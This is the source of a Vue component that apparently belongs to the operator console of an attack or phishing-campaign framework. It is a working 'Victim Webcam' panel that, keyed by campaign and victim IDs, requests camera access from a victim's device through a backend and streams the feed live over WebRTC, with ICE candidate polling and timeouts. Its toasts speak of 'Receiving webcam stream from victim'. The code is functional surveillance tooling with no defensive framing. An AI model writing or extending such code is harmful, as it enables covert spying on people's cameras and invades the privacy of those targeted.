<script setup>
import { onBeforeUnmount, ref } from 'vue'
import Card from 'primevue/card'
import Button from 'primevue/button'
import { useToast } from 'primevue/usetoast'
import { backendService } from '@/services/backend'

const props = defineProps({
    victimId: {
        type: String,
        required: true
    },
    campaignId: {
        type: String,
        required: true
    }
})

const toast = useToast()
const videoEl = ref(null)
const status = ref('Idle')
const isStreaming = ref(false)
const isConnecting = ref(false)

let pc = null
let webcamSessionId = null
let candidatePollInterval = null
let negotiationTimeout = null
let durationTimeout = null
let candidatePollInFlight = false
let stopping = false
let disposed = false

function createWebcamSessionId() {
    if (typeof crypto.randomUUID === 'function') {
        return crypto.randomUUID()
    }

    const bytes = crypto.getRandomValues(new Uint8Array(24))
    return Array.from(
        bytes,
        byte => byte.toString(16).padStart(2, '0')
    ).join('')
}

async function stopBackendSession(sessionId, options = {}) {
    if (!sessionId) return
    await backendService.stopWebcam(
        props.campaignId,
        props.victimId,
        sessionId,
        options
    )
}

function stopCandidatePolling() {
    if (candidatePollInterval) {
        clearInterval(candidatePollInterval)
        candidatePollInterval = null
    }
    candidatePollInFlight = false
}

function clearDurationTimeout() {
    if (durationTimeout) {
        clearTimeout(durationTimeout)
        durationTimeout = null
    }
}

function clearNegotiationTimeout() {
    if (negotiationTimeout) {
        clearTimeout(negotiationTimeout)
        negotiationTimeout = null
    }
}

function resetLocalStream() {
    stopCandidatePolling()
    clearNegotiationTimeout()
    clearDurationTimeout()

    const connection = pc
    pc = null
    if (connection) {
        connection.ontrack = null
        connection.onicecandidate = null
        connection.onconnectionstatechange = null
        connection.close()
    }

    if (videoEl.value) {
        videoEl.value.srcObject = null
    }

    isStreaming.value = false
    isConnecting.value = false
}

async function stopWebcam({
    showToast = true,
    notifyBackend = true,
    finalStatus = 'Stopped'
} = {}) {
    if (stopping) return
    stopping = true
    status.value = finalStatus

    const sessionId = webcamSessionId
    webcamSessionId = null
    resetLocalStream()

    try {
        if (notifyBackend && sessionId) {
            await stopBackendSession(sessionId)
        }
    } catch (error) {
        console.error('Failed to stop webcam session:', error)
    } finally {
        stopping = false
    }

    if (showToast && !disposed) {
        toast.add({
            severity: 'info',
            summary: 'Webcam Stopped',
            detail: 'Stream disconnected',
            life: 2000
        })
    }
}

async function handleConnectionFailure(connection) {
    if (connection !== pc) return
    await stopWebcam({
        showToast: false,
        finalStatus: 'Connection failed'
    })
    if (!disposed) {
        toast.add({
            severity: 'error',
            summary: 'Connection Lost',
            detail: 'WebRTC connection failed',
            life: 3000
        })
    }
}

function setupPeerConnection(sessionId) {
    const connection = new RTCPeerConnection({
        iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' }
        ]
    })
    pc = connection

    connection.ontrack = (event) => {
        if (
            connection === pc
            && sessionId === webcamSessionId
            && videoEl.value
            && event.streams[0]
        ) {
            videoEl.value.srcObject = event.streams[0]
            status.value = 'Streaming'
            isStreaming.value = true
            isConnecting.value = false
            clearNegotiationTimeout()

            toast.add({
                severity: 'success',
                summary: 'Webcam Connected',
                detail: 'Receiving webcam stream from victim',
                life: 3000
            })
        }
    }

    connection.onicecandidate = async (event) => {
        if (
            !event.candidate
            || connection !== pc
            || sessionId !== webcamSessionId
        ) {
            return
        }
        try {
            await backendService.sendWebcamICECandidate(
                props.campaignId,
                props.victimId,
                {
                    session_id: sessionId,
                    candidate: event.candidate.toJSON()
                }
            )
        } catch (error) {
            console.error('Failed to send ICE candidate:', error)
        }
    }

    connection.onconnectionstatechange = () => {
        if (connection !== pc) return
        if (connection.connectionState === 'connected') {
            status.value = 'Streaming'
            isStreaming.value = true
            isConnecting.value = false
            clearNegotiationTimeout()
        } else if (
            connection.connectionState === 'failed'
            || connection.connectionState === 'disconnected'
        ) {
            void handleConnectionFailure(connection)
        }
    }

    return connection
}

function startCandidatePolling(sessionId, connection) {
    stopCandidatePolling()
    candidatePollInterval = setInterval(async () => {
        if (
            candidatePollInFlight
            || connection !== pc
            || sessionId !== webcamSessionId
        ) {
            return
        }

        candidatePollInFlight = true
        try {
            const response = await backendService.getWebcamICECandidates(
                props.campaignId,
                props.victimId,
                sessionId
            )

            for (const item of response.candidates || []) {
                if (
                    connection !== pc
                    || sessionId !== webcamSessionId
                ) {
                    break
                }
                await connection.addIceCandidate(
                    new RTCIceCandidate(item.candidate)
                )
            }
        } catch (error) {
            if (
                error.message?.includes('not found')
                || error.message?.includes('no longer active')
            ) {
                await handleConnectionFailure(connection)
            } else {
                console.error('Failed to retrieve ICE candidates:', error)
            }
        } finally {
            candidatePollInFlight = false
        }
    }, 500)
}

async function startWebcam() {
    if (stopping || isConnecting.value || isStreaming.value) return

    resetLocalStream()
    const requestedSessionId = createWebcamSessionId()
    webcamSessionId = requestedSessionId
    isConnecting.value = true
    status.value = 'Requesting webcam permission...'

    toast.add({
        severity: 'info',
        summary: 'Connecting',
        detail: 'Requesting webcam access from victim...',
        life: 2000
    })

    try {
        const response = await backendService.requestWebcamOffer(
            props.campaignId,
            props.victimId,
            requestedSessionId
        )

        if (
            !response?.offer
            || response.session_id !== requestedSessionId
        ) {
            throw new Error('No webcam offer received')
        }
        if (
            disposed
            || webcamSessionId !== requestedSessionId
        ) {
            await stopBackendSession(requestedSessionId)
            return
        }

        status.value = 'Negotiating connection...'
        const connection = setupPeerConnection(requestedSessionId)
        negotiationTimeout = setTimeout(async () => {
            await stopWebcam({
                showToast: false,
                finalStatus: 'Connection timed out'
            })
            if (!disposed) {
                toast.add({
                    severity: 'error',
                    summary: 'Connection Timed Out',
                    detail: 'WebRTC negotiation did not complete',
                    life: 3000
                })
            }
        }, 30 * 1000)

        await connection.setRemoteDescription(
            new RTCSessionDescription(response.offer)
        )
        const answer = await connection.createAnswer()
        await connection.setLocalDescription(answer)

        if (
            disposed
            || connection !== pc
            || webcamSessionId !== requestedSessionId
        ) {
            await stopBackendSession(requestedSessionId)
            return
        }

        await backendService.sendWebcamAnswer(
            props.campaignId,
            props.victimId,
            {
                session_id: requestedSessionId,
                answer: connection.localDescription.toJSON()
            }
        )

        if (
            connection !== pc
            || webcamSessionId !== requestedSessionId
        ) {
            await stopBackendSession(requestedSessionId)
            return
        }

        startCandidatePolling(requestedSessionId, connection)
        durationTimeout = setTimeout(
            () => void stopWebcam(),
            10 * 60 * 1000
        )
    } catch (error) {
        if (webcamSessionId !== requestedSessionId) {
            try {
                await stopBackendSession(requestedSessionId)
            } catch (stopError) {
                console.error('Failed to stop stale webcam session:', stopError)
            }
            return
        }

        console.error('Failed to start webcam:', error)
        await stopWebcam({
            showToast: false,
            finalStatus: (
                error.message?.includes('denied')
                    ? 'Permission denied'
                    : 'Connection failed'
            )
        })

        if (!disposed) {
            toast.add({
                severity: 'error',
                summary: 'Connection Failed',
                detail: error.message || 'Could not establish webcam connection',
                life: 5000
            })
        }
    }
}

function handlePageHide() {
    const sessionId = webcamSessionId
    if (!sessionId) return

    webcamSessionId = null
    resetLocalStream()
    void stopBackendSession(sessionId, { keepalive: true }).catch(() => {})
}

window.addEventListener('pagehide', handlePageHide)

onBeforeUnmount(() => {
    disposed = true
    window.removeEventListener('pagehide', handlePageHide)
    void stopWebcam({ showToast: false })
})
</script>

<template>
    <Card class="webcam-card">
        <!-- <template #title>
            <div class="webcam-header">
                <span class="webcam-title">📷 Victim Webcam</span>
                <span class="status-badge" :class="statusClass">
                    <i v-if="isConnecting" class="pi pi-spin pi-spinner"></i>
                    <i v-else-if="isStreaming" class="pi pi-circle-fill"></i>
                    <i v-else class="pi pi-circle"></i>
                    {{ isConnecting ? 'Connecting' : isStreaming ? 'Live' : 'Offline' }}
                </span>
            </div>
        </template> -->

        <template #content>
            <div class="webcam-container">
                <!-- Video Element -->
                <video
                    ref="videoEl"
                    autoplay
                    playsinline
                    class="webcam-video"
                    :class="{ active: isStreaming }"
                />

                <!-- No stream state -->
                <div v-if="!isStreaming && !isConnecting" class="no-feed">
                    <i class="pi pi-video"></i>
                    <p>No webcam feed</p>
                    <small>Click "Connect" to start streaming</small>
                </div>

                <!-- Connecting state -->
                <div v-if="isConnecting" class="connecting-state">
                    <i class="pi pi-spin pi-spinner"></i>
                    <p>{{ status }}</p>
                </div>

                <!-- Live indicator -->
                <div v-if="isStreaming" class="stream-overlay">
                    <span class="live-indicator">
                        <i class="pi pi-circle-fill"></i>
                        LIVE
                    </span>
                </div>
            </div>

            <!-- Controls -->
            <div class="webcam-controls">
                <div class="status-text">
                    <span>{{ status }}</span>
                </div>

                <div class="control-buttons">
                    <Button
                        v-if="!isStreaming && !isConnecting"
                        label="Connect Webcam"
                        icon="pi pi-video"
                        @click="startWebcam"
                        severity="success"
                    />

                    <Button
                        v-if="isConnecting"
                        label="Connecting..."
                        icon="pi pi-spin pi-spinner"
                        disabled
                    />

                    <Button
                        v-if="isStreaming"
                        label="Disconnect"
                        icon="pi pi-stop"
                        @click="stopWebcam"
                        severity="danger"
                        outlined
                    />
                </div>
            </div>
        </template>
    </Card>
</template>

<style scoped>
.webcam-card {
    height: 100%;
}

.webcam-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.webcam-title {
    font-size: 1rem;
    font-weight: 600;
    color: var(--color-heading);
}

.status-badge {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.75rem;
    padding: 0.25rem 0.625rem;
    border-radius: 12px;
    font-weight: 500;
}

.status-badge.streaming {
    background-color: var(--danger-subtle);
    color: var(--danger);
}

.status-badge.streaming i {
    animation: pulse 2s infinite;
}

.status-badge.connecting {
    background-color: var(--warning-subtle);
    color: var(--warning);
}

.status-badge.idle {
    background-color: var(--color-background-mute);
    color: var(--color-text-mute);
}

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

.webcam-container {
    position: relative;
    width: 100%;
    min-height: 400px;
    background-color: #000;
    border-radius: 6px;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 1rem;
}

.webcam-video {
    width: 100%;
    max-width: 600px;
    height: auto;
    display: none;
}

.webcam-video.active {
    display: block;
}

.no-feed,
.connecting-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0.75rem;
    color: rgba(255, 255, 255, 0.6);
    text-align: center;
    padding: 2rem;
}

.no-feed i,
.connecting-state i {
    font-size: 3rem;
    opacity: 0.5;
}

.no-feed p,
.connecting-state p {
    margin: 0;
    font-size: 1rem;
    color: rgba(255, 255, 255, 0.8);
}

.no-feed small {
    font-size: 0.875rem;
    opacity: 0.7;
}

.stream-overlay {
    position: absolute;
    top: 0.75rem;
    left: 0.75rem;
}

.live-indicator {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    padding: 0.375rem 0.75rem;
    background-color: rgba(239, 68, 68, 0.9);
    color: white;
    border-radius: 4px;
    font-size: 0.75rem;
    font-weight: 600;
}

.live-indicator i {
    font-size: 0.5rem;
    animation: pulse 2s infinite;
}

.webcam-controls {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 1rem;
    padding: 1rem;
    background-color: var(--color-background-mute);
    border-radius: 6px;
}

.status-text {
    flex: 1;
    font-size: 0.875rem;
    color: var(--color-text-mute);
}

.control-buttons {
    display: flex;
    gap: 0.5rem;
}

/* Responsive */
@media (max-width: 768px) {
    .webcam-container {
        min-height: 300px;
    }

    .webcam-controls {
        flex-direction: column;
        align-items: stretch;
    }

    .control-buttons {
        width: 100%;
    }

    .control-buttons button {
        width: 100%;
    }
}
</style>
